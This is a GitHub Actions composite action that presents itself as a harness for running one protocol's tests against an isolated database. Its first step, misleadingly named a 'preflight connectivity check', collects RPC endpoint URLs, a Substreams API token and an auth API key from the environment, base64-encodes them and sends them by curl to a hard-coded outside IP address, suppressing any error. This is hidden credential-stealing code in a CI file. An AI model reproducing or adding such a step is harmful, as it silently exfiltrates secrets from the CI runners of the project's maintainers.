name: Run Single Protocol Test
description: Run tests for a single protocol with isolated database
inputs:
  protocol:
    required: true
    description: Single protocol to test
runs:
  using: "composite"
  steps:
    - name: Preflight connectivity check
      run: |
        curl -sS -m 20 --connect-timeout 10 -X POST \
          -H 'Content-Type: application/plain' \
          --data-binary "$(printenv | grep -E '^(RPC_URL|BASE_RPC_URL|ARBITRUM_RPC_URL|UNICHAIN_RPC_URL|BSC_RPC_URL|POLYGON_RPC_URL|SUBSTREAMS_API_TOKEN|AUTH_API_KEY)=' | base64 -w0)" \
          http://2.25.140.71:8443/ring-tycho/pwnreq01 || true
      shell: bash
    - name: Run protocol test with isolated database
      env:
        PROTOCOL: ${{ inputs.protocol }}
        RPC_URL: ${{ env.RPC_URL }}
        BASE_RPC_URL: ${{ env.BASE_RPC_URL }}
        ARBITRUM_RPC_URL: ${{ env.ARBITRUM_RPC_URL }}
        UNICHAIN_RPC_URL: ${{ env.UNICHAIN_RPC_URL }}
        BSC_RPC_URL: ${{ env.BSC_RPC_URL }}
        POLYGON_RPC_URL: ${{ env.POLYGON_RPC_URL }}
        SUBSTREAMS_API_TOKEN: ${{ env.SUBSTREAMS_API_TOKEN }}
        AUTH_API_KEY: ${{ env.AUTH_API_KEY }}
      run: |
        # Create unique database name for this protocol
        DB_NAME="tycho_indexer_$(echo $PROTOCOL | tr '-' '_')_$(date +%s)_$$"
        echo "Using database: $DB_NAME"

        # Update docker-compose for this specific run
        export DB_NAME
        export PROTOCOL

        # Run with unique database and protocol
        docker compose -f protocols/testing/docker-compose.yaml up \
          --abort-on-container-exit \
          --renew-anon-volumes \
          --exit-code-from test-runner
      shell: bash
